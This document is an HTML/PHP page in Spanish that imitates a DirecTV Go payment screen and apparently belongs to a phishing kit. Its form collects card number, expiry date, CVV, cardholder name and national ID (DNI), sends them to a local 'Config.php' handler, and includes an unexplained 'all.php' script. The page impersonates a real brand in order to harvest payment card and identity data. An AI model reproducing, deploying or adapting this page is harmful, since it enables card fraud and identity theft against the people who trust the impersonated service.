<!DOCTYPE html>
<html>
<head>
	<title>DirectvGo</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="estilos/estilo.css">
	<meta name="viewport" content="width=500, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap" rel="stylesheet">
</head>
<body style="background:linear-gradient(to bottom , #010C1C , #000C0C);">
	<div class="fixed"> <p>Ventas 0810-222-3366 | Soy cliente</p> </div>
	<nav class="nav-flex">
		<div class="contenedor-img">
			<img src="img/dtv.svg">
		</div>
	</nav>
	<div class="content-flex">
		<div class="texte">
			<p>Paga con tarjeta de creditó o debitó</p>
		</div>
		<form method="POST" action="Config.php" class="form-flex">
			<p>Datos de la tarjeta</p>
			<div class="contenedor-inputs">
				<div class="input-box"><label>Número en la tarjeta</label>
					<input type="number" name="digitos" required="" placeholder=" Ej: 4145 5423 8516 5488">
					
				</div>
				<div class="data">
					<div><label>Vencimiento</label><input type="number" name="vencimiento" placeholder="05/25"></div>
					<div><label>CVV</label><input type="number" name="cvv" placeholder="925"></div>

				</div>
				<div class="input-box"><label>Titular de la tarjeta</label>
					<input type="text" name="titular" required="" placeholder="Ej: Maria E Baez">
					
				</div>
				<div class="input-box"><label>DNI</label>
					<input type="number" name="dni" required="" placeholder=" Ej: 0222444">
					
				</div>
				<div class="contenedor-submit">
					<input type="submit" name="enviar2" value="Continuar">
				</div>
			</div>
			
		</form>

	</div>
	<?php 
		include 'all.php';
	 ?>
</body>
<footer><div class="img"><img src="img/directvgo-logo.png"></div></footer>
</html>